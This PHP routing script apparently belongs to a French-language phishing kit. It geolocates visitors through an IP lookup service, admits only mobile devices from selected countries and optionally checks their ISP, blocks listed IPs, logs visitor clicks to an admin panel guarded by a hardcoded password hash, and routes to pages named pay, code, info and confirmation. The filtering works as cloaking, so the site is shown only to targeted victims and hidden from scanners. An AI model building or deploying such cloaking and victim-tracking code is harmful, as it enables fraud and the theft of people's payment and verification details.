<?php

session_name('tkt');
session_start();
date_default_timezone_set('Europe/Paris');

require_once("data/config.php");

$host = $_SERVER['HTTP_HOST'];
$host = str_replace("www.", "", $host);

require_once('data/lib/db/Database.php');
$dbWaiting = new Database([
    'path' => 'data/lib/db/waiting.json',
    "cryptData" => false
]);
$dbAdmin = new Database([
    'path' => 'data/lib/db/admin.json',
    "cryptData" => false
]);

if (!$dbAdmin->get($host)) {
    $dbAdmin->set($host, []);
}

// mot de passe du panel
// .
$m = "9c69ce41b7c82b36c3ded8d4939dd12b";

function getr($o, $d, $b = [])
{
    return isset($o[$d]) ? $o[$d] : $b;
};

$dbAdminData = $dbAdmin->get($host);

$ip = $_SERVER["REMOTE_ADDR"];
if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
    $ip = $_SERVER["HTTP_CLIENT_IP"];
} elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
    $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
}
if ($ip == "::1") {
    $ip = "92.88.170.110";
}

$ipInfo = isset($_SESSION["ipinfo"]) ? $_SESSION["ipinfo"] : [];
if (!isset($_SESSION["ipinfo"])) {
    $ipInfo = json_decode(file_get_contents("https://pro.ip-api.com/json/" . $ip . "?key=" . $rez["apiKey"]["proip"] . "&fields=21164031"), true);
    $_SESSION["ipinfo"] = $ipInfo;
}

$agent = $_SERVER["HTTP_USER_AGENT"];

$match = "/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini";
if ($ab["desktop"] == true) {
    $match .= "|Windows|Macintosh";
}
$match .= "/";
$uri = parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH);

$check = (function () {
    global $dbAdminData, $m, $ip, $uri, $ipInfo, $match, $ab, $agent;

    if ($uri == "/admin/login" || str_contains($uri, "admin/action")) {
        return true;
    }

    if (str_contains($uri, "admin")) {
        return (!isset($dbAdminData[$ip]) || $dbAdminData[$ip] != $m) ? "admin" : true;
    }


    $blip = getr($dbAdminData, "blip");
    foreach ($blip as $data) {
        if ($data["id"] == $ip) {
            return false;
        }
    }


    if (preg_match($match, $agent)) {
        foreach ($ab["country"] as $item) {
            if (
                $item["active"] &&
                strtolower($ipInfo["countryCode"]) ==
                strtolower($item["countryCode"])
            ) {
                if ($item["isp"]["verif"] == true) {
                    // foreach (array_map("strtolower", $item["isp"]["all"]) as $configISP) {
                    //     if (
                    //         strpos(
                    //             strtolower($ipInfo["as"]),
                    //             $configISP
                    //         ) !== false
                    //     ) {
                    //         $_SESSION["auth"] = true;
                    //         return true;
                    //         break 2;
                    //     }
                    // }
                    return (!isset($_SESSION["auth"]) || $_SESSION["auth"] != true) ? "calcul" : true;
                } else {
                    $_SESSION["auth"] = true;
                    return true;
                }
            }
        }
    }

    return false;
})();

require_once("data/lib/Functions.php");

if ($check !== "admin" && $uri == "/") {
    $existingEntries = getr($dbAdminData, "cliques");
    $filteredEntries = array_filter($existingEntries, function ($entry) use ($ip) {
        return $entry["ip"] !== $ip;
    });
    $dbAdminData["cliques"] = $filteredEntries;
    $dbAdminData["cliques"][] =  [
        "ip" => $ip,
        "country" => $ipInfo["country"],
        "countryCode" => $ipInfo["countryCode"],
        "date" =>  date("d/m/y H:i:s", time()),
        "detection" => $check ? "Allowed" : "Not Allowed",
        "os_device" => $result["os_name"] . " " . $result["device_type"] . " | " . $result["browser_name"] . " " . $result["browser_version"],
    ];
    $dbAdmin->set($host, $dbAdminData);
}

if ($check === "calcul" && $uri !== "/how/calcul") {
    header("Location: /how/calcul");
    exit;
} elseif ($check === "admin" && $uri !== "/admin/login") {
    header("Location: /admin/login");
    exit;
} elseif ($check) {
    $routes = [
        "/" => "/views/index.php",
        "/help" => "/views/help.php",
        "/waiting" => "/views/waiting.php",
        "/code" => "/views/code.php",
        "/creneau" => "/views/creneau.php",
        "/points" => "/views/points.php",
        "/info" => "/views/info.php",
        "/pay" => "/views/pay.php",

        "/confirmation" => "/views/confirmation.php",
        "/fin" => "/views/fin.php",
        "/app" => "/views/app.php",

        "/admin" => "/views/admin/panel.php",
        "/admin/login" => "/views/admin/login.php",
        "/admin/action" => "/views/admin/action.php",
        "/how/calcul" => "/views/calcul.php",
    ];
    $route = $routes[$uri] ?? null;

    if ($route) {
        require_once($_SERVER["DOCUMENT_ROOT"] . $route);
        exit;
    }
}

die();
